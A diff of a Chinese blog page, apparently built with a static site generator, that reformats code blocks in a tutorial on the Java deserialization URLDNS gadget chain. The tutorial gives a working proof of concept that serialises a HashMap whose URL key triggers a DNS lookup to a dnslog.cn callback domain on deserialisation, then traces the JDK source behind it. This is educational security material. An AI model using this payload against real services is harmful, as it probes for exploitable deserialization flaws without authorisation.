@@ -100,10 +100,6 @@
           <a href="/friends/">Friends</a>
         </li>
       
-        <li class="nav-item" data-path="/about/">
-          <a href="/about/">About</a>
-        </li>
-      
     </ul>
   </div>
 </div>
@@ -209,141 +205,28 @@
 <h1 id="简易利用链及利用方法"><a href="#简易利用链及利用方法" class="headerlink" title="简易利用链及利用方法"></a>简易利用链及利用方法</h1><h2 id="URLDNS平台"><a href="#URLDNS平台" class="headerlink" title="URLDNS平台"></a>URLDNS平台</h2><p>学习该章，推荐使用<a target="_blank" rel="noopener" href="http://www.dnslog.cn/">http://www.dnslog.cn</a></p>
 <p>点击Get SubDomain可以得到一个域名。</p>
 <p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116201121893.png" alt="image-20211116201121893"></p>
-<h2 id="简易利用链"><a href="#简易利用链" class="headerlink" title="简易利用链"></a>简易利用链</h2><pre><code class="java">import java.io.FileInputStream;
-import java.io.FileOutputStream;
-import java.io.ObjectInputStream;
-import java.io.ObjectOutputStream;
-import java.lang.reflect.Field;
-import java.net.URL;
-import java.util.HashMap;
+<h2 id="简易利用链"><a href="#简易利用链" class="headerlink" title="简易利用链"></a>简易利用链</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;URL, String&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, String&gt;();<span class="comment">// 定义一个hashMap，key为URL,value为String</span></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://e3h66m.dnslog.cn&quot;</span>);<span class="comment">// 设置我们触发dns查询的url</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 下面在put前修改url的hashcode为非-1的值，put后将hashcode修改为-1</span></span><br><span class="line">        <span class="comment">// 1. 将url的hashCode字段设置为允许修改</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 2. 设置url的hashCode字段为任意不为-1的值</span></span><br><span class="line">        f.set(url, <span class="number">111</span>);</span><br><span class="line">        System.out.println(url.hashCode()); <span class="comment">// 获取hashCode的值，验证是否修改成功</span></span><br><span class="line">        <span class="comment">// 3. 将 url 放入 hashMap 中，右边参数随便写</span></span><br><span class="line">        hashMap.put(url, <span class="string">&quot;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="comment">// 4. 修改url的hashCode字段为-1，为了触发DNS查询（之后会解释）</span></span><br><span class="line">        f.set(url, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化操作</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反序列化，触发payload</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-public class URLDNS &#123;
-    public static void main(String[] args) throws Exception &#123;
-        HashMap&lt;URL, String&gt; hashMap = new HashMap&lt;URL, String&gt;();// 定义一个hashMap，key为URL,value为String
-        URL url = new URL(&quot;http://e3h66m.dnslog.cn&quot;);// 设置我们触发dns查询的url
-        
-        // 下面在put前修改url的hashcode为非-1的值，put后将hashcode修改为-1
-        // 1. 将url的hashCode字段设置为允许修改
-        Field f = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;);
-        f.setAccessible(true);
-        // 2. 设置url的hashCode字段为任意不为-1的值
-        f.set(url, 111);
-        System.out.println(url.hashCode()); // 获取hashCode的值，验证是否修改成功
-        // 3. 将 url 放入 hashMap 中，右边参数随便写
-        hashMap.put(url, &quot;&quot; +
-                &quot;&quot;);
-        // 4. 修改url的hashCode字段为-1，为了触发DNS查询（之后会解释）
-        f.set(url, -1);
-
-        //序列化操作
-        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;out.bin&quot;));
-        oos.writeObject(hashMap);
-
-        //反序列化，触发payload
-        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;out.bin&quot;));
-        ois.readObject();
-    &#125;
-&#125;
-</code></pre>
 <p>运行上述代码后，刷新DNSURL平台页面，发现已有记录 - 利用成功。</p>
 <h1 id="简易利用链分析-Java-1-7"><a href="#简易利用链分析-Java-1-7" class="headerlink" title="简易利用链分析(Java 1.7)"></a>简易利用链分析(Java 1.7)</h1><h2 id="HashMap-readObject"><a href="#HashMap-readObject" class="headerlink" title="HashMap.readObject()"></a>HashMap.readObject()</h2><p>我们在<code>ois.readObject()</code>处下断点，分析反序列化的过程。</p>
 <p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116201341776.png" alt="image-20211116201341776"></p>
 <p>利用点主要在<code>HashMap</code>类下的<code>readObject()</code>，之前我们有讲过，<code>readObject()</code>方法是可以被复写的，所以之前的代码中的<code>ois.readObject();</code>实际上会call到我们序列化的<code>HashMap</code>中的<code>readObject()</code>。</p>
 <p>跟进去看一下：</p>
-<pre><code class="java">private void readObject(java.io.ObjectInputStream s)
-     throws IOException, ClassNotFoundException
-&#123;
-    s.defaultReadObject();//此处执行默认的readObject()方法
-    if (loadFactor &lt;= 0 || Float.isNaN(loadFactor)) &#123;//判断loadFactor的值是否合法
-        throw new InvalidObjectException(&quot;Illegal load factor: &quot; +
-                                           loadFactor);
-    &#125;
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">     <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    s.defaultReadObject();<span class="comment">//此处执行默认的readObject()方法</span></span><br><span class="line">    <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor)) &#123;<span class="comment">//判断loadFactor的值是否合法</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                           loadFactor);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化一个空表</span></span><br><span class="line">    table = (Entry&lt;K,V&gt;[]) EMPTY_TABLE;</span><br><span class="line"></span><br><span class="line">    s.readInt(); <span class="comment">// 获取key-value的个数</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)<span class="comment">//判断个数值是否合法</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> +</span><br><span class="line">                                           mappings);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//下面初始化Capacity</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">capacity</span> <span class="operator">=</span> (<span class="type">int</span>) Math.min(</span><br><span class="line">                mappings * Math.min(<span class="number">1</span> / loadFactor, <span class="number">4.0f</span>),</span><br><span class="line">                <span class="comment">// we have limits...</span></span><br><span class="line">                HashMap.MAXIMUM_CAPACITY);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// allocate the bucket array;</span></span><br><span class="line">    <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        inflateTable(capacity);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        threshold = capacity;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    init();  <span class="comment">// Give subclass a chance to do its thing.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">    <span class="comment">//获取keys和values，并进行PUT操作</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">        <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();<span class="comment">//获取key</span></span><br><span class="line">        <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();<span class="comment">//获取value</span></span><br><span class="line">        putForCreate(key, value);<span class="comment">//重点在此处</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-    // 初始化一个空表
-    table = (Entry&lt;K,V&gt;[]) EMPTY_TABLE;
-
-    s.readInt(); // 获取key-value的个数
-
-    int mappings = s.readInt();
-    if (mappings &lt; 0)//判断个数值是否合法
-        throw new InvalidObjectException(&quot;Illegal mappings count: &quot; +
-                                           mappings);
-
-    //下面初始化Capacity
-    int capacity = (int) Math.min(
-                mappings * Math.min(1 / loadFactor, 4.0f),
-                // we have limits...
-                HashMap.MAXIMUM_CAPACITY);
-
-    // allocate the bucket array;
-    if (mappings &gt; 0) &#123;
-        inflateTable(capacity);
-    &#125; else &#123;
-        threshold = capacity;
-    &#125;
-
-    init();  // Give subclass a chance to do its thing.
-
-    // Read the keys and values, and put the mappings in the HashMap
-    //获取keys和values，并进行PUT操作
-    for (int i = 0; i &lt; mappings; i++) &#123;
-        K key = (K) s.readObject();//获取key
-        V value = (V) s.readObject();//获取value
-        putForCreate(key, value);//重点在此处
-    &#125;
-&#125;
-</code></pre>
 <h2 id="putForCreate"><a href="#putForCreate" class="headerlink" title="putForCreate()"></a>putForCreate()</h2><p>继续跟进<code>putForCreate(key,value)</code></p>
-<pre><code class="java">private void putForCreate(K key, V value) &#123;
-    int hash = null == key ? 0 : hash(key);//*判断key是否为空，如果不为空，计算key的hash值*
-    int i = indexFor(hash, table.length);
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">putForCreate</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> <span class="literal">null</span> == key ? <span class="number">0</span> : hash(key);<span class="comment">//*判断key是否为空，如果不为空，计算key的hash值*</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> indexFor(hash, table.length);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Look for preexisting entry for key.  This will never happen for</span></span><br><span class="line"><span class="comment">     * clone or deserialize.  It will only happen for construction if the</span></span><br><span class="line"><span class="comment">     * input Map is a sorted map whose ordering is inconsistent w/ equals.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[i]; e != <span class="literal">null</span>; e = e.next) &#123;</span><br><span class="line">        Object k;</span><br><span class="line">        <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">            ((k = e.key) == key || (key != <span class="literal">null</span> &amp;&amp; key.equals(k)))) &#123;</span><br><span class="line">            e.value = value;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    createEntry(hash, key, value, i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-    /**
-     * Look for preexisting entry for key.  This will never happen for
-     * clone or deserialize.  It will only happen for construction if the
-     * input Map is a sorted map whose ordering is inconsistent w/ equals.
-     */
-    for (Entry&lt;K,V&gt; e = table[i]; e != null; e = e.next) &#123;
-        Object k;
-        if (e.hash == hash &amp;&amp;
-            ((k = e.key) == key || (key != null &amp;&amp; key.equals(k)))) &#123;
-            e.value = value;
-            return;
-        &#125;
-    &#125;
-
-    createEntry(hash, key, value, i);
-&#125;
-</code></pre>
 <h2 id="hash"><a href="#hash" class="headerlink" title="hash()"></a>hash()</h2><p>注意我们这里call的是<code>hash(key)</code>，我们看看<code>hash()</code>是怎么实现的。</p>
-<pre><code class="java">final int hash(Object k) &#123;//此处k为我们传入的HashMap的key
-    int h = hashSeed;//此处会获取hashSeed（默认为0）
-    if (0 != h &amp;&amp; k instanceof String) &#123;//如果hashSeed不为0，且传入的Object为String的话执行下面代码
-        return sun.misc.Hashing.stringHash32((String) k);
-    &#125;
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object k)</span> &#123;<span class="comment">//此处k为我们传入的HashMap的key</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> hashSeed;<span class="comment">//此处会获取hashSeed（默认为0）</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != h &amp;&amp; k <span class="keyword">instanceof</span> String) &#123;<span class="comment">//如果hashSeed不为0，且传入的Object为String的话执行下面代码</span></span><br><span class="line">        <span class="keyword">return</span> sun.misc.Hashing.stringHash32((String) k);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    h ^= k.hashCode();<span class="comment">//否则执行传入的object的hashCode</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// This function ensures that hashCodes that differ only by</span></span><br><span class="line">    <span class="comment">// constant multiples at each bit position have a bounded</span></span><br><span class="line">    <span class="comment">// number of collisions (approximately 8 at default load factor).</span></span><br><span class="line">    h ^= (h &gt;&gt;&gt; <span class="number">20</span>) ^ (h &gt;&gt;&gt; <span class="number">12</span>);</span><br><span class="line">    <span class="keyword">return</span> h ^ (h &gt;&gt;&gt; <span class="number">7</span>) ^ (h &gt;&gt;&gt; <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-    h ^= k.hashCode();//否则执行传入的object的hashCode
-
-    // This function ensures that hashCodes that differ only by
-    // constant multiples at each bit position have a bounded
-    // number of collisions (approximately 8 at default load factor).
-    h ^= (h &gt;&gt;&gt; 20) ^ (h &gt;&gt;&gt; 12);
-    return h ^ (h &gt;&gt;&gt; 7) ^ (h &gt;&gt;&gt; 4);
-&#125;
-</code></pre>
 <h2 id="hashCode"><a href="#hashCode" class="headerlink" title="hashCode()"></a>hashCode()</h2><p><strong>重点</strong>：很明显，<code>k.hashCode()</code>是指URL类的hashCode()方法，因为我们传入的是URL object，所以我们需要跟踪<code>URL.hashCode();</code></p>
-<pre><code class="java">public synchronized int hashCode() &#123;
-    if (hashCode != -1)//如果hashCode不等于-1，那么我们就返回hashCode
-        return hashCode;
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)<span class="comment">//如果hashCode不等于-1，那么我们就返回hashCode</span></span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="built_in">this</span>);<span class="comment">//否则调用 handler.hashCode() 计算 hash 值 .</span></span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-    hashCode = handler.hashCode(this);//否则调用 handler.hashCode() 计算 hash 值 .
-    return hashCode;
-&#125;
-</code></pre>
 <p>此时我们仍然没有发现有触发DNS请求的地方，如果hashCode不等于-1，直接返回hashCode，我们的这条链就走不下去了，所以我们得保证<strong>hashCode等于-1</strong>，这样我们才能执行<code>handler.hashCode(this);</code></p>
 <p>由代码可知，hashCode默认值为-1</p>
-<pre><code class="java">private int hashCode = -1;
-</code></pre>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="variable">hashCode</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+
 <p>但是当我们通过 <code>HashMap.readObject()</code> 方法获取 key 的值时 ,key 的HashCode 就不会为 <code>-1</code> 了（注释掉前面利用链代码中修改hashCode的部分进行断点调试），如下图：</p>
 <p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116204410674.png" alt="image-20211116204410674"></p>
 <p>所以我们需要手动修改HashCode，让它为-1 - 这也是为什么简易利用链中用<code>f.set(url, -1);</code>设置hashCode为-1。但同时我们发现，在生成payload时的<code>put()</code>函数也会经过这条链：</p>
@@ -352,64 +235,12 @@ public class URLDNS &#123;
 <p>但我们不能让他在生成payload的时候就发送URLDNS请求，所以我们可以在生成payload - **执行hashMap.put()**之前改变hashCode的值，让它不为-1，在put完之后再改回-1方便payload被执行。</p>
 <p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116210115810.png" alt="image-20211116210115810"></p>
 <h2 id="handler-hashCode"><a href="#handler-hashCode" class="headerlink" title="handler.hashCode()"></a>handler.hashCode()</h2><p>继续跟进<code>hashCode = handler.hashCode(this);</code></p>
-<pre><code class="java">protected int hashCode(URL u) &#123;
-    int h = 0;
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the protocol part.</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">protocol</span> <span class="operator">=</span> u.getProtocol();<span class="comment">//获取协议</span></span><br><span class="line">    <span class="keyword">if</span> (protocol != <span class="literal">null</span>)</span><br><span class="line">        h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the host part.</span></span><br><span class="line">    <span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);<span class="comment">//获取地址</span></span><br><span class="line">    <span class="keyword">if</span> (addr != <span class="literal">null</span>) &#123;</span><br><span class="line">        h += addr.hashCode();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> u.getHost();</span><br><span class="line">        <span class="keyword">if</span> (host != <span class="literal">null</span>)</span><br><span class="line">            h += host.toLowerCase().hashCode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the file part.</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> u.getFile();</span><br><span class="line">    <span class="keyword">if</span> (file != <span class="literal">null</span>)</span><br><span class="line">        h += file.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the port part.</span></span><br><span class="line">    <span class="keyword">if</span> (u.getPort() == -<span class="number">1</span>)<span class="comment">//获取端口</span></span><br><span class="line">        h += getDefaultPort();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        h += u.getPort();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the ref part.</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">ref</span> <span class="operator">=</span> u.getRef();</span><br><span class="line">    <span class="keyword">if</span> (ref != <span class="literal">null</span>)</span><br><span class="line">        h += ref.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-    // Generate the protocol part.
-    String protocol = u.getProtocol();//获取协议
-    if (protocol != null)
-        h += protocol.hashCode();
-
-    // Generate the host part.
-    InetAddress addr = getHostAddress(u);//获取地址
-    if (addr != null) &#123;
-        h += addr.hashCode();
-    &#125; else &#123;
-        String host = u.getHost();
-        if (host != null)
-            h += host.toLowerCase().hashCode();
-    &#125;
-
-    // Generate the file part.
-    String file = u.getFile();
-    if (file != null)
-        h += file.hashCode();
-
-    // Generate the port part.
-    if (u.getPort() == -1)//获取端口
-        h += getDefaultPort();
-    else
-        h += u.getPort();
-
-    // Generate the ref part.
-    String ref = u.getRef();
-    if (ref != null)
-        h += ref.hashCode();
-
-    return h;
-&#125;
-</code></pre>
 <p>由代码可知，java会先获取protocol,所以我们在构造利用链的时候，<strong>需要将我们接收URLDNS的地址加上相应的协议(如http://)</strong></p>
 <h2 id="getHostAddress"><a href="#getHostAddress" class="headerlink" title="getHostAddress()"></a>getHostAddress()</h2><p>我们继续跟进<code>getHostAddress(u);</code></p>
-<pre><code class="java">protected synchronized InetAddress getHostAddress(URL u) &#123;
-    if (u.hostAddress != null)//先判断该URL的hostAddress属性是否已经有值了
-        return u.hostAddress;//如果已有值，直接返回
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (u.hostAddress != <span class="literal">null</span>)<span class="comment">//先判断该URL的hostAddress属性是否已经有值了</span></span><br><span class="line">        <span class="keyword">return</span> u.hostAddress;<span class="comment">//如果已有值，直接返回</span></span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> u.getHost();<span class="comment">//获取Host</span></span><br><span class="line">    <span class="keyword">if</span> (host == <span class="literal">null</span> || host.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            u.hostAddress = InetAddress.getByName(host);<span class="comment">//获取IP地址，并把值赋给URL的hostAddress</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnknownHostException ex) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SecurityException se) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> u.hostAddress;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-    String host = u.getHost();//获取Host
-    if (host == null || host.equals(&quot;&quot;)) &#123;
-        return null;
-    &#125; else &#123;
-        try &#123;
-            u.hostAddress = InetAddress.getByName(host);//获取IP地址，并把值赋给URL的hostAddress
-        &#125; catch (UnknownHostException ex) &#123;
-            return null;
-        &#125; catch (SecurityException se) &#123;
-            return null;
-        &#125;
-    &#125;
-    return u.hostAddress;
-&#125;
-</code></pre>
 <p>从上面我们可以看到，如果程序在之前已经执行过payload(或者已经访问过我们设置的DNS)，就不会再触发第二次，因为已有缓存在<code>hostAddress</code>处。 所以我们需要提供一个<strong>没有被解析过的域名</strong>。</p>
 <h2 id="InetAddress-getByName"><a href="#InetAddress-getByName" class="headerlink" title="InetAddress.getByName()"></a>InetAddress.getByName()</h2><p>继续跟进<code>InetAddress.getByName(host)</code></p>
 <p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116210657890.png" alt="image-20211116210657890"></p>
@@ -417,80 +248,17 @@ public class URLDNS &#123;
 <h2 id="getAllByName"><a href="#getAllByName" class="headerlink" title="getAllByName()"></a>getAllByName()</h2><p>一直跟进到<code>getAllByName()</code></p>
 <p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116211025208.png" alt="image-20211116211025208"></p>
